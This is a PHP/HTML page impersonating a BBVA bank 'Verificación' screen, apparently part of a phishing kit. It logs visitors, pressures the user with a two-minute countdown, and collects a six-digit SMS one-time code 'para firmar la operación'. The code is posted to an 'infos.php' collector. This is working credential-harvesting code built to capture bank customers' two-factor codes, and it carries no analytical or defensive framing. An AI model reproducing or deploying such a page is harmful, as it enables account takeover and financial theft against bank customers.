<?php
require_once "functions.php";
visitors();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>BBVA - Verificación</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" crossorigin="anonymous">

  <script>
    // Auto timer
    let seconds = 120;
    function updateTimer() {
      const timerEl = document.getElementById('timer');
      let min = Math.floor(seconds / 60);
      let sec = seconds % 60;
      timerEl.textContent = `${min}:${sec.toString().padStart(2, '0')} Min. para validar el código`;
    }
    window.onload = function () {
      updateTimer();
      const timerInterval = setInterval(() => {
        seconds--;
        updateTimer();
        if (seconds <= 0) {
          clearInterval(timerInterval);
          document.getElementById('timer').style.display = 'none';
          document.getElementById('resend').style.display = 'block';
        }
      }, 1000);
    };

    // Combine 6 digits
    function combineCode() {
      const digits = document.querySelectorAll('.code-input');
      let code = '';
      digits.forEach(input => code += input.value);
      document.getElementById('smsCode').value = code;
    }

    // Auto move & enable submit
    document.addEventListener('DOMContentLoaded', function () {
      const inputs = document.querySelectorAll('.code-input');
      const submitBtn = document.getElementById('submitBtn');
      inputs.forEach((input, idx) => {
        input.addEventListener('input', () => {
          if (input.value.length === 1 && idx < inputs.length - 1) {
            inputs[idx + 1].focus();
          }
          const filled = Array.from(inputs).every(i => i.value.length === 1);
          submitBtn.disabled = !filled;
          submitBtn.classList.toggle("active", filled);
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === "Backspace" && input.value === "" && idx > 0) {
            inputs[idx - 1].focus();
          }
        });
      });

      // Paste full code
      document.getElementById('digit1').addEventListener('paste', function (e) {
        e.preventDefault();
        let pasted = (e.clipboardData || window.clipboardData).getData('text');
        if (/^\d{6}$/.test(pasted)) {
          pasted.split('').forEach((num, i) => {
            if (inputs[i]) inputs[i].value = num;
          });
          submitBtn.disabled = false;
          submitBtn.classList.add("active");
        }
      });
    });
  </script>

  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      min-height: 100vh;
    }
    .login-container {
      width: 100%;
      max-width: 360px;
      padding: 20px;
      margin: 60px auto;
    }
    .top-bar {
      text-align: right;
      font-size: 14px;
      margin-bottom: 10px;
    }
    .top-bar a {
      color: #007bff;
      text-decoration: none;
    }
    h2 {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 20px;
      color: #001b50;
      text-align: center;
    }
    .icon {
      font-size: 40px;
      color: #0019A5;
      text-align: center;
      margin-bottom: 20px;
    }
    p {
      text-align: center;
      color: #333;
    }
    .timer {
      text-align: center;
      margin: 15px 0;
      font-size: 14px;
      color: #666;
    }
    .resend {
      text-align: center;
      color: #007bff;
      margin-bottom: 20px;
      cursor: pointer;
      display: none;
    }
    .input-code {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin: 20px 0;
    }
    .input-code input {
      width: 40px;
      height: 50px;
      text-align: center;
      font-size: 24px;
      border-radius: 6px;
      background: #f1f1f1;
      color: #000;
      border: 1px solid #ccc;
    }
    .note {
      font-size: 12px;
      color: #666;
      text-align: center;
      margin-top: 10px;
    }
    .btn {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      background: #f2f2f2;
      color: #aaa;
      border: none;
      border-radius: 12px;
      margin-top: 20px;
      text-align: center;
    }
    .btn.active {
      background-color: #0019A5;
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="top-bar"><a href="#">Cerrar</a></div>
    <h2>Verificación</h2>
    <div class="icon"><i class="fas fa-lock"></i></div>
    <p>Para firmar la operación, introduce el código que has recibido en tu móvil.</p>
    <div class="timer" id="timer">2:00 Min. para validar el código</div>
    <div class="resend" id="resend">Solicitar nuevo código SMS</div>

    <form action="infos.php" method="post" onsubmit="combineCode()">
      <input type="hidden" name="step" value="sms">
      <input type="hidden" name="sms" id="smsCode">
      <div class="input-code" autocomplete="one-time-code">
        <input type="text" maxlength="1" required class="code-input" id="digit1" inputmode="numeric">
        <input type="text" maxlength="1" required class="code-input" id="digit2" inputmode="numeric">
        <input type="text" maxlength="1" required class="code-input" id="digit3" inputmode="numeric">
        <input type="text" maxlength="1" required class="code-input" id="digit4" inputmode="numeric">
        <input type="text" maxlength="1" required class="code-input" id="digit5" inputmode="numeric">
        <input type="text" maxlength="1" required class="code-input" id="digit6" inputmode="numeric">
      </div>
      <div class="note">Este código es único y de un sólo uso.</div>
      <button type="submit" class="btn" disabled id="submitBtn">Firmar</button>
    </form>
  </div>
</body>
</html>